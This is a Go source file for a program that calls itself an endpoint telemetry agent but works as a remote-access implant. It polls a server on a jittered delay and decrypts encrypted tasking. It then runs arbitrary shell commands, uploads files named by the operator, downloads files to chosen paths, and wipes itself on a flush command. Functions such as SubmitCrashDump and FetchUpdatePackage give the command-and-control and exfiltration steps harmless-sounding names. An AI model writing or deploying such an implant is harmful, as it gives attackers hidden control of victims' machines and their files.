package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"

	"endpoint-telemetry/funcs"
)

type DeviceTelemetryPayload struct {
	EndpointID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type SyncResponse struct {
	Status string `json:"status"`
	Jobs  []DiagnosticJob `json:"jobs"`
}

type DiagnosticJob struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type DiagnosticOutput struct {
	JobID int    `json:"task_id"`
	Output string `json:"output"`
}

func main() {
	InitializeTelemetry()

	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", SyncDelayMin, SyncDelayMax)

	for {
		jobs, err := SyncDeviceState(hostname, agentOS)
		if err != nil {
			fmt.Printf("[!] Check-in failed: %v\n", err)
			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
			continue
		}

		fmt.Printf("[+] Checked in - %d pending job(s)\n", len(jobs))

		for _, job := range jobs {
			fmt.Printf("[>] Executing job #%d: %s\n", job.ID, job.Command)

			if job.Command == FlushCommand {
				fmt.Println("[!] Cache flush command received from server")
				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
				funcs.WipeLocalCacheAndExit()
			}

			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
			if funcs.IsPathUpdate(job.Command) {
				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
				if cdErr != nil {
					output = fmt.Sprintf("Error: %v", cdErr)
				}
				fmt.Printf("[<] Job #%d result: %s\n", job.ID, output)
				_ = SubmitDiagnosticReport(job.ID, output)
				continue
			}

			if strings.HasPrefix(job.Command, "get ") {
				go func(t DiagnosticJob) {
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
					if err != nil {
						output = fmt.Sprintf("Upload error: %v", err)
					}
					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}(job)
				continue
			}

			if strings.HasPrefix(job.Command, "download ") {
				go func(t DiagnosticJob) {
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {
						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
						return
					}
					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
					if err != nil {
						output = fmt.Sprintf("Download error: %v", err)
					}
					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}(job)
				continue
			}

			go func(t DiagnosticJob) {
				output, execErr := funcs.ExecuteDiagnosticTask(t.Command)
				if execErr != nil && output == "" {
					output = fmt.Sprintf("Error: %v", execErr)
				}
				fmt.Printf("[<] Job #%d result (%d bytes)\n", t.ID, len(output))
				err := SubmitDiagnosticReport(t.ID, output)
				if err != nil {
					fmt.Printf("[!] Failed to send result for job #%d: %v\n", t.ID, err)
				}
			}(job)
		}

		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
	}
}

func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {
	payload := DeviceTelemetryPayload{
		EndpointID:  EndpointID,
		Hostname: hostname,
		OS:       agentOS,
	}

	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
	if err != nil {
		return nil, err
	}

	// Unwrap the encrypted response envelope
	var envelope struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal(respBody, &envelope); err != nil {
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}

	var result SyncResponse
	if err := json.Unmarshal(plain, &result); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}
	return result.Jobs, nil
}

func SubmitDiagnosticReport(jobID int, output string) error {
	payload := DiagnosticOutput{
		JobID: jobID,
		Output: output,
	}
	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
	return err
}

// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {kid, data} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func transmitSecureTelemetry(url string, payload any) ([]byte, error) {
	inner, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("marshal: %w", err)
	}

	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	envelope := map[string]string{"kid": KeyID, "data": enc}
	body, err := json.Marshal(envelope)
	if err != nil {
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("post: %w", err)
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}
